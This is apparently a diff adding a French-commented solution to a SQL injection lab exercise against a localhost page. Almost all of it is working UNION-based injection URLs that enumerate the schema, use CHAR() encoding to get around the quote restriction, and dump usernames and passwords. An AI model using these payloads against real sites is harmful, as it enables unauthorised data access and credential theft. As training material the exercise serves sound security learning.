@@ -1,0 +1,48 @@
+
+
+#On vérifie si une injection est possible. On ne peut pas utiliser de guillemet, mais des opérations arithmétiques sont possibles
+
+http://localhost/Exo2/?category=2-1
+
+#On détermine le nombre de champs que la requete renvoie
+
+http://localhost/Exo2/?category=1 ORDER BY 2
+http://localhost/Exo2/?category=1 ORDER BY 3
+
+#Pour ORDER BY 3, rien ne s'affiche sur la page. Il y a donc 2 champs renvoyés. 
+
+http://localhost/Exo2/?category=1 UNION SELECT 1, 2
+http://localhost/Exo2/?category=1 UNION SELECT 1, 2, 3
+
+#On cherche le nom de la base utilisée
+
+http://localhost/Exo2/?category=-1 UNION SELECT 1, database()
+
+#On traduit ce nom en char sur python
+
+s = "injectionSQL2"
+for i in range(len(s)):
+	print(ord(s[i]))
+
+105,110,106,101,99,116,105,111,110,83,81,76,50
+
+#On regarde les tables de la base
+
+http://localhost/Exo2/?category=-1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(105,110,106,101,99,116,105,111,110,83,81,76,50)
+
+#On traduit la table qui nous interesse en char
+
+s = "users"
+for i in range(len(s)):
+	print(ord(s[i]))
+
+117,115,101,114,115
+
+#On regarde les colonnes de la table users
+
+http://localhost/Exo2/?category=-1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(105,110,106,101,99,116,105,111,110,83,81,76,50) AND TABLE_NAME = CHAR(117,115,101,114,115)
+
+#On affiche les contenu des colonnes
+
+http://localhost/Exo2/?category=-1 UNION SELECT 1, username FROM users
+http://localhost/Exo2/?category=-1 UNION SELECT 1, password FROM users
